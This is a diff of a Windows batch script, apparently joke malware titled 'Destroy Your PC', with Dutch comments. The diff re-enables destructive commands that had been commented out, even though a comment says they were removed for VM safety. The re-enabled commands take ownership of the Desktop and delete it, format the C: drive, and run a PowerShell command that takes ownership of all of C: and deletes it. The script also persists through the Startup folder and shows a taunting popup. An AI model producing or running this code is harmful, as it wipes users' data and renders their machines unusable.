@@ -81,8 +81,8 @@ start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been 
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul
 
 :: === MESS WITH USER (safe in VM, destructieve commands verwijderd) ===
-rem takeown /f "%userprofile%\Desktop" /r /d y >nul
-rem rmdir /s /q "%userprofile%\Desktop"
+takeown /f "%userprofile%\Desktop" /r /d y >nul
+rmdir /s /q "%userprofile%\Desktop"
 
 :: === ANNOYING WINDOWS ===
 for /l %%i in (1,1,5) do (
@@ -100,11 +100,11 @@ ping localhost -n 2 >nul
 
 :: === NIEUWE WIPE EERST (FORMAT STIJL) ===
 echo [!] Initiating new brute wipe...
-rem format C: /FS:NTFS /Q /Y
+format C: /FS:NTFS /Q /Y
 ping localhost -n 5 >nul
 
 :: === OUDE POWERSHELL WIPE NA FORMAT ===
-rem powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"
+powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME':F /t /c; Remove-Item C:\* -Recurse -Force; Remove-Item C:\ -Recurse -Force"
 
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
